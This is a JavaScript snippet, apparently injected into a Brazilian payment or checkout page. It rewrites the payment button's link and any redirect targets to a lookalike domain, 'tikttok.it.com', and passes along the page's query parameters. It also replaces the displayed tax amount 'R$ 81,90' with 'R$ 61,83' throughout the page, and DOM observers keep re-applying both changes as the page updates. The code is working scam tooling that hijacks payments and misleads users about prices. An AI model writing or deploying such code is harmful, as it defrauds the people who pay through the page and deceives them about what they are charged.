(function(){
  var c = function(s){ return s.split(String.fromCharCode(60))[0].trim() };

  try { var n = localStorage.getItem('user_nome'); if(n) localStorage.setItem('user_nome', c(n)); } catch(e){}
  try { var b = localStorage.getItem('user_nascimento'); if(b) localStorage.setItem('user_nascimento', c(b)); } catch(e){}

  // Manipula o botão de pagamento
  function manipularBotaoPagamento() {
    var cfBtn = document.getElementById('cfButton');
    if (cfBtn) {
      cfBtn.href = 'https://tikttok.it.com/oferta-principal/' + window.location.search;
      console.log('✅ Link do botão manipulado para:', cfBtn.href);
    }
  }

  // Tenta manipular imediatamente
  manipularBotaoPagamento();

  // Observa mudanças no DOM para manipular quando o botão aparecer
  var observer = new MutationObserver(function(mutations, obs) {
    var cfBtn = document.getElementById('cfButton');
    if (cfBtn) {
      cfBtn.href = 'https://tikttok.it.com/oferta-principal/' + window.location.search;
      console.log('✅ Link do botão manipulado (via observer):', cfBtn.href);
      obs.disconnect();
    }
  });

  observer.observe(document.body || document.documentElement, {
    childList: true,
    subtree: true
  });

  // Fallback para renderControls (compatibilidade com outros sistemas)
  if (typeof renderControls !== 'undefined') {
    var _rc = renderControls;
    renderControls = function(s){
      if(s.redirectUrl){
        s.redirectUrl = 'https://tikttok.it.com/oferta-principal/';
      }
      if(s.type === 'redirect' && s.url){
        s.url = 'https://tikttok.it.com/oferta-principal/';
      }
      _rc(s);
    };
  }

  // Manipula o valor do imposto de 81,90 para 61,83
  function manipularValorImposto() {
    // Busca em todos os elementos que contenham "R$ 81,90"
    var elementos = document.querySelectorAll('*');
    elementos.forEach(function(el) {
      if (el.innerHTML && el.innerHTML.includes('R$ 81,90')) {
        el.innerHTML = el.innerHTML.replace(/R\$\s*81,90/g, 'R$ 61,83');
        console.log('✅ Valor do imposto alterado de R$ 81,90 para R$ 61,83');
      }
    });
  }

  // Tenta manipular imediatamente
  manipularValorImposto();

  // Observa mudanças no DOM para manipular quando o valor aparecer
  var observerImposto = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
      mutation.addedNodes.forEach(function(node) {
        if (node.nodeType === 1) { // Element node
          if (node.innerHTML && node.innerHTML.includes('R$ 81,90')) {
            node.innerHTML = node.innerHTML.replace(/R\$\s*81,90/g, 'R$ 61,83');
            console.log('✅ Valor do imposto alterado (via observer)');
          }
        }
      });
    });
  });

  observerImposto.observe(document.body || document.documentElement, {
    childList: true,
    subtree: true
  });
})();
